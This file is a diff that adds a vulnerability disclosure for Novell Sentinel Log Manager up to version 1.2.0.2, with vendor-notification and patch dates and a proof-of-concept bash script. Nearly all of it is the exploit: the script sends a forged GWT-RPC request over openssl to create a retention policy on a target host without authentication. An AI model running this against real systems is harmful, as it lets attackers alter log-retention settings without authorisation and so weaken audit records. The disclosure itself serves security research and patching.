@@ -1,0 +1,39 @@
+Novell Sentinel Log Manager ver. <=1.2.0.2 allows unauthenticated
+users configuring retention policies.
+
+Vendor informed: 2012/09/06
+Patch Released: 2012/09/21
+PoC:
+
+#!/bin/bash
+
+TARGET=$1
+PORT=8443
+
+if [ $# -ne 1 ]; then
+  echo "Usage: `basename $0` target"
+  exit 1
+fi
+
+echo "POST /novelllogmanager/datastorageservice.rpc HTTP/1.1
+Host: $TARGET:$PORT
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/15.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Content-Type: text/x-gwt-rpc; charset=utf-8
+X-GWT-Permutation: whatever
+X-GWT-Module-Base:
+https://$TARGET:$PORT/novelllogmanager/com.novell.siem.logmanager.LogManager/
+Content-Length: 385
+Cookie: JSESSIONID=whatever
+Pragma: no-cache
+Cache-Control: no-cache
+Connection: close
+
+5|0|9|https://$TARGET:$PORT/novelllogmanager/com.novell.siem.logmanager.LogManager/|E377321CAAD2FABED6283BD3643E4289|com.novell.sentinel.scout.client.datastorage.SentinelDataStorageService|createRetentionPolicy|com.novell.sentinel.scout.client.datastorage.retention.RetentionPolicy/419393389|sev:[0
+TO 5]|1|AAA|java.util.ArrayList/3821976829|1|2|3|4|1|5|5|0|0|0|6|1|7|7|8|0|0|9|0|
+
+
+" | openssl s_client -quiet -connect $TARGET:$PORT
